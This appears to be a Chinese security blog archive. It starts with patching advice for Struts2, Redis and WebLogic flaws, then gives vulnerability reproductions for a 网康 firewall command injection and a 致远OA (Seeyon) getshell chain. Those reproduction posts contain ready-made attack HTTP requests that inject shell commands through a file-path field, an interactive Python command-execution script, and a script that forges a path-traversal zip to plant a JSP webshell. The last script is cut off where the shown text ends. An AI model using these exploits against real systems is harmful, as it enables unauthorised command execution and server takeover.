class="headerlink" title="修复建议"></a>修复建议</h3><p>建议用户到官方获取最新补丁或者最新版本程序。</p><h1 id="Apache-Struts2-DevMode-远程代码执行漏洞"><a href="#Apache-Struts2-DevMode-远程代码执行漏洞" class="headerlink" title="Apache Struts2 DevMode 远程代码执行漏洞"></a>Apache Struts2 DevMode 远程代码执行漏洞</h1><h3 id="漏洞描述-31"><a href="#漏洞描述-31" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　为了便于开发人员调试程序，Struts2提供了一个devMode模式，可以方便查看程序错误以及日志等信息。当Struts2中的devMode模式设置为true时，存在严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p><h3 id="修复建议-32"><a href="#修复建议-32" class="headerlink" title="修复建议"></a>修复建议</h3><p>  建议用户到官方获取最新补丁或者最新版本程序。</p><p>  或者将struts.properties中的devMode设置为false，或是在struts.xml中添加如下代码： &lt;constant name=”struts.devMode”value=”false”/&gt;。</p><h1 id="Apache-Struts2-远程代码执行漏洞（S2-045）"><a href="#Apache-Struts2-远程代码执行漏洞（S2-045）" class="headerlink" title="Apache Struts2 远程代码执行漏洞（S2-045）"></a>Apache Struts2 远程代码执行漏洞（S2-045）</h1><h3 id="漏洞描述-32"><a href="#漏洞描述-32" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　Apache Struts2的Jakarta Multipartparser插件存在远程代码执行漏洞，漏洞编号为CVE-2017-5638。攻击者可以在使用该插件上传文件时，修改HTTP请求头中的Content-Type值来触发该漏洞，导致远程执行代码。</p><h3 id="修复建议-33"><a href="#修复建议-33" class="headerlink" title="修复建议"></a>修复建议</h3><p>　　检测方式查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar ，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。</p><p>  1、建议用户到官方获取最新补丁或者最新版本程序。</p><p>  2、更新至Strusts2.3.32或者Strusts2.5.10.1，或使用第三方的防护设备进行防护。</p><p>  3、临时解决方案：删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。</p><p>  4、修改WEB-INF/classes目录下的配置</p><p>  在WEB-INF/classes目录下的struts.xml中的struts 标签下添加</p><p>  &lt;constantname=”struts.custom.i18n.resources”value=”global”/&gt;；</p><p>  在WEB-INF/classes/目录下添加global.properties，文件内容如下:</p><p>  struts.messages.upload.error.InvalidContentTypeException=1</p><h1 id="Apache-Struts2-远程代码执行漏洞（S2-033）"><a href="#Apache-Struts2-远程代码执行漏洞（S2-033）" class="headerlink" title="Apache Struts2 远程代码执行漏洞（S2-033）"></a>Apache Struts2 远程代码执行漏洞（S2-033）</h1><h3 id="漏洞描述-33"><a href="#漏洞描述-33" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　Apache Struts2在开启动态方法调用（DynamicMethod Invocation）的情况下，攻击者使用REST插件调用恶意表达式可以远程执行代码。</p><h3 id="修复建议-34"><a href="#修复建议-34" class="headerlink" title="修复建议"></a>修复建议</h3><p>1、用户到官方获取最新补丁或者最新版本程序。</p><p>2、或者在允许的情况下禁用动态方法调用（Dynamic Method Invocation），修改Struts2的配置文件struts.xml，将struts.enable.DynamicMethodInvocation设置为“false”。</p><h1 id="redis相关漏洞修复"><a href="#redis相关漏洞修复" class="headerlink" title="redis相关漏洞修复"></a>redis相关漏洞修复</h1><h3 id="漏洞描述-34"><a href="#漏洞描述-34" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>redis默认没有口令可能会造成未授权访问造成信息泄露，若redis为高权限账户运行，可能导致服务器权限丢失等。</p><h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h3><p>1.禁用一些高危命令</p><p>常见如：flushdb，flushall，config，keys 等</p><p>2.以低权限运行 Redis 服务</p><p>3.为 Redis 添加密码验证</p><p>4.禁止外网访问 Redis</p><p>5.保证 authorized_keys 文件的安全</p><h1 id="weblogic反序列化-CVE-2019-2729"><a href="#weblogic反序列化-CVE-2019-2729" class="headerlink" title="weblogic反序列化(CVE-2019-2729)"></a>weblogic反序列化(CVE-2019-2729)</h1><h3 id="漏洞描述-35"><a href="#漏洞描述-35" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>CVE-2019-2729漏洞是由于应用在处理反序列化输入信息时存在缺陷，攻击者可以通过发送精心构造的恶意 HTTP 请求，用于获得目标服务器的权限，并在未授权的情况下执行远程命令，最终获取服务器的权限。与CVE-2019-2725漏洞类似。</p><p>漏洞编号：CVE-2019-2725</p><p>影响版本：10.3.6.0、12.1.3.0、12.2.1.3</p><h3 id="修复建议-35"><a href="#修复建议-35" class="headerlink" title="修复建议"></a>修复建议</h3><p>  1.目前厂商已经发布了最新升级补丁以修复这些安全问题，强烈建议您尽快安装最新补丁；<br>  2.使用安全组策略屏蔽7001内网入和公网入方向流量。</p>]]></content>
      
      
      <categories>
          
          <category> 安全知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网康下一代防火墙   命令执行</title>
      <link href="2021/04/13/%E7%BD%91%E5%BA%B7%E9%98%B2%E7%81%AB%E5%A2%99-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>2021/04/13/%E7%BD%91%E5%BA%B7%E9%98%B2%E7%81%AB%E5%A2%99-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="自行搭建环境"><a href="#自行搭建环境" class="headerlink" title="自行搭建环境"></a>自行搭建环境</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E7%BD%91%E5%BA%B72.webp" alt="image"></p><h3 id="漏洞路径："><a href="#漏洞路径：" class="headerlink" title="漏洞路径："></a>漏洞路径：</h3><pre><code>/directdata/direct/router</code></pre><h3 id="数据包："><a href="#数据包：" class="headerlink" title="数据包："></a>数据包：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;directdata&#x2F;direct&#x2F;router HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.86</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 160</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;&quot;action&quot;:&quot;SSLVPN_Resource&quot;,&quot;method&quot;:&quot;deleteImage&quot;,&quot;data&quot;:[&#123;&quot;data&quot;:[&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;d.txt;id &gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;test.txt&quot;]&#125;],&quot;type&quot;:&quot;rpc&quot;,&quot;tid&quot;:17,&quot;f8839p7rqtj&quot;:&quot;&#x3D;&quot;&#125;</span><br></pre></td></tr></table></figure><h3 id="执行命令："><a href="#执行命令：" class="headerlink" title="执行命令："></a>执行命令：</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E7%BD%91%E5%BA%B71.webp" alt="image"></p><h4 id="查看结果"><a href="#查看结果" class="headerlink" title="查看结果"></a>查看结果</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E7%BD%91%E5%BA%B73.webp" alt="image"></p><h3 id="懒人："><a href="#懒人：" class="headerlink" title="懒人："></a>懒人：</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxy = &#123;&#x27;http&#x27;: &#x27;127.0.0.1:8080&#x27;, &#x27;https&#x27;: &#x27;127.0.0.1:8080&#x27;&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">urllist,cmdsr</span>):</span></span><br><span class="line">    url = urllist+<span class="string">&#x27;/directdata/direct/router&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&quot;action&quot;</span>: <span class="string">&quot;SSLVPN_Resource&quot;</span>, <span class="string">&quot;data&quot;</span>: [&#123;<span class="string">&quot;data&quot;</span>: [<span class="string">&quot;/var/www/html/d.txt;%s &gt;/var/www/html/test.txt&quot;</span> % cmdsr]&#125;], <span class="string">&quot;f8839p7rqtj&quot;</span>: <span class="string">&quot;=&quot;</span>, <span class="string">&quot;method&quot;</span>: <span class="string">&quot;deleteImage&quot;</span>, <span class="string">&quot;tid&quot;</span>: <span class="number">17</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;rpc&quot;</span>&#125;</span><br><span class="line">    cmdlist = requests.post(url=url,json=data,verify=<span class="literal">False</span>)</span><br><span class="line">    urlshow = urllist+<span class="string">&#x27;/test.txt&#x27;</span></span><br><span class="line">    cmdshow = requests.get(url=urlshow,verify=<span class="literal">False</span>)</span><br><span class="line">    cmdshowlist =  cmdshow.text</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cmdshowlist) == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">&#x27;未读取到执行结果请检查命令是否正确，或不存在漏洞&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;------------------------------执行结果----------------------------------\n&#x27;</span>)</span><br><span class="line">    print(cmdshow.text)</span><br><span class="line">    print(<span class="string">&#x27;------------------------------------------------------------------------\n&#x27;</span>)</span><br><span class="line">    jhlist = <span class="built_in">input</span>(<span class="string">&#x27;输入下条需要执行的命令--退出输入T：&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> jhlist == <span class="string">&#x27;T&#x27;</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd(urllist,jhlist)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(<span class="string">&#x27;------------------------------------------------------------------------\n&#x27;</span>)</span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&#x27;请输入url-格式为:https://xx.xx.xx.xx:    &#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;------------------------------------------------------------------------\n&#x27;</span>)</span><br><span class="line">    cmdsr = <span class="built_in">input</span>(<span class="string">&#x27;输入需要执行的命令：&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;------------------------------------------------------------------------\n&#x27;</span>)</span><br><span class="line">    cmd(url,cmdsr)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E7%BD%91%E5%BA%B75.webp" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>致远OA 组合getshell</title>
      <link href="2021/04/10/%E8%87%B4%E8%BF%9COA-%E7%BB%84%E5%90%88getshell/"/>
      <url>2021/04/10/%E8%87%B4%E8%BF%9COA-%E7%BB%84%E5%90%88getshell/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="测试版本为：-致远A8-V5协同管理软件-V6-1SP2"><a href="#测试版本为：-致远A8-V5协同管理软件-V6-1SP2" class="headerlink" title="测试版本为： 致远A8-V5协同管理软件 V6.1SP2"></a>测试版本为： 致远A8-V5协同管理软件 V6.1SP2</h2><h3 id="自行搭建环境："><a href="#自行搭建环境：" class="headerlink" title="自行搭建环境："></a>自行搭建环境：</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%87%B4%E8%BF%9C1.webp" alt="image"></p><h3 id="Getshell分三步"><a href="#Getshell分三步" class="headerlink" title="Getshell分三步"></a>Getshell分三步</h3><pre><code>1.获取cookie信息  2.上传压缩文件   3.解压压缩文件得到shell</code></pre><h4 id="获取cookie信息"><a href="#获取cookie信息" class="headerlink" title="获取cookie信息"></a>获取cookie信息</h4><p>漏洞文件</p><pre><code>/seeyon/thirdpartyController.do </code></pre><p>数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;thirdpartyController.do HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.88:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 133</span><br><span class="line"></span><br><span class="line">method&#x3D;access&amp;enc&#x3D;TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&amp;clientPath&#x3D;127.0.0.1</span><br></pre></td></tr></table></figure><p> 获取到cookie<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%87%B4%E8%BF%9C2.webp" alt="image"></p><h4 id="上传压缩文件"><a href="#上传压缩文件" class="headerlink" title="上传压缩文件"></a>上传压缩文件</h4><p>漏洞点：</p><pre><code>/seeyon/fileUpload.do?method=processUpload&amp;maxSize=</code></pre><p>数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;fileUpload.do?method&#x3D;processUpload&amp;maxSize&#x3D; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.88:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.1.88:8080&#x2F;seeyon&#x2F;fileUpload.do?method&#x3D;processUpload&amp;maxSize&#x3D;</span><br><span class="line">Cookie: JSESSIONID&#x3D;A4D1CCA965228F523B70833968568BE6</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------1416682316313</span><br><span class="line">Content-Length: 1179</span><br><span class="line"></span><br><span class="line">-----------------------------1416682316313</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;type&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------1416682316313</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;extensions&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------1416682316313</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;applicationCategory&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------1416682316313</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;destDirectory&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------1416682316313</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;destFilename&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------1416682316313</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;maxSize&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------1416682316313</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;isEncrypt&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------1416682316313</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file1&quot;; filename&#x3D;&quot;123.zip&quot;</span><br><span class="line">Content-Type: application&#x2F;x-zip-compressed</span><br><span class="line"></span><br><span class="line">zip文件</span><br><span class="line">-----------------------------1416682316313--</span><br></pre></td></tr></table></figure><p>直接替换上传数据包cookie与地址信息发送会返回一个fileurls值<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%87%B4%E8%BF%9C3.webp" alt="image"></p><h3 id="3-解压文件得到shell"><a href="#3-解压文件得到shell" class="headerlink" title="3.解压文件得到shell"></a>3.解压文件得到shell</h3><p>漏洞文件</p><pre><code>/seeyon/ajax.do</code></pre><p>数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;ajax.do HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.88:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: JSESSIONID&#x3D;A4D1CCA965228F523B70833968568BE6</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 142</span><br><span class="line"></span><br><span class="line">method&#x3D;ajaxAction&amp;managerName&#x3D;portalDesignerManager&amp;managerMethod&#x3D;uploadPageLayoutAttachment&amp;arguments&#x3D;[0,&quot;2021-04-10&quot;,&quot;2708692024033719158&quot;]</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%87%B4%E8%BF%9C4.webp" alt="image"></p><h2 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果"></a>验证结果</h2><p>访问压缩包里的文件进行验证 解压后文件位置位于 </p><pre><code>/seeyon/common/designer/pageLayout/压缩包里文件名</code></pre><p>成功getshell<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%87%B4%E8%BF%9C5.webp" alt="image"></p><h2 id="注：制作zip文件"><a href="#注：制作zip文件" class="headerlink" title="注：制作zip文件"></a>注：制作zip文件</h2><p>新建两个文件</p><pre><code>layout.xml  必须存在否则在利用解压漏洞时会解压失败空内容即可12345678.txt  可是任意名称与内容 想上传webshell替换成webshell内容与jsp后缀即可</code></pre><p>压缩成zip文件<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%87%B4%E8%BF%9C6.webp" alt="image"></p><p>使用文本编辑zip包把shell文件名前三位替换成..\修改前和修改后位数不能变否则zip文件损坏<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%87%B4%E8%BF%9C7.webp" alt="image"></p><p>保存查看效果<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%87%B4%E8%BF%9C8.webp" alt="image"></p><p>反正能用：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">la = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_random_str</span>(<span class="params">randomlength=<span class="number">16</span></span>):</span></span><br><span class="line">  random_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  base_str = <span class="string">&#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line">  length = <span class="built_in">len</span>(base_str) - <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(randomlength):</span><br><span class="line">    random_str += base_str[random.randint(<span class="number">0</span>, length)]</span><br><span class="line">  <span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line">mm = generate_random_str(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">webshell_name1 = mm+<span class="string">&#x27;.jsp&#x27;</span></span><br><span class="line">webshell_name2 = <span class="string">&#x27;../&#x27;</span>+webshell_name1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_zip</span>():</span></span><br><span class="line">    shell = <span class="string">&#x27;test&#x27;</span>   <span class="comment">## 替换shell内容</span></span><br><span class="line">    zf = zipfile.ZipFile(mm+<span class="string">&#x27;.zip&#x27;</span>, mode=<span class="string">&#x27;w&#x27;</span>, compression=zipfile.ZIP_DEFLATED)</span><br><span class="line">    zf.writestr(<span class="string">&#x27;layout.xml&#x27;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    zf.writestr(webshell_name2, shell)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Seeyon_Getshell</span>(<span class="params">urllist</span>):</span></span><br><span class="line"></span><br><span class="line">    url = urllist+<span class="string">&#x27;/seeyon/thirdpartyController.do&#x27;</span></span><br><span class="line">    post = <span class="string">&quot;method=access&amp;enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&amp;clientPath=127.0.0.1&quot;</span></span><br><span class="line">    response = requests.post(url=url, data=post, headers=la)</span><br><span class="line">    <span class="keyword">if</span> response <span class="keyword">and</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;set-cookie&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(response.headers).lower():</span><br><span class="line">        cookie = response.cookies</span><br><span class="line">        cookies = requests.utils.dict_from_cookiejar(cookie)</span><br><span class="line">        jsessionid = cookies[<span class="string">&#x27;JSESSIONID&#x27;</span>]</span><br><span class="line">        file_zip()</span><br><span class="line">        print( <span class="string">&#x27;获取cookie成功----&gt;&gt; &#x27;</span>+jsessionid)</span><br><span class="line">        fileurl = urllist+<span class="string">&#x27;/seeyon/fileUpload.do?method=processUpload&amp;maxSize=&#x27;</span></span><br><span class="line">        headersfile = &#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&quot;JSESSIONID=%s&quot;</span> % jsessionid&#125;</span><br><span class="line">        post = &#123;<span class="string">&#x27;callMethod&#x27;</span>: <span class="string">&#x27;resizeLayout&#x27;</span>, <span class="string">&#x27;firstSave&#x27;</span>: <span class="string">&quot;true&quot;</span>, <span class="string">&#x27;takeOver&#x27;</span>: <span class="string">&quot;false&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;isEncrypt&#x27;</span>: <span class="string">&quot;0&quot;</span>&#125;</span><br><span class="line">        file = [(<span class="string">&#x27;file1&#x27;</span>, (<span class="string">&#x27;test.png&#x27;</span>, <span class="built_in">open</span>(mm+<span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;image/png&#x27;</span>))]</span><br><span class="line">        filego = requests.post(url=fileurl,data=post,files=file, headers=headersfile)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;获取cookie失败&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">if</span> filego.text:</span><br><span class="line">        fileid1 = re.findall(<span 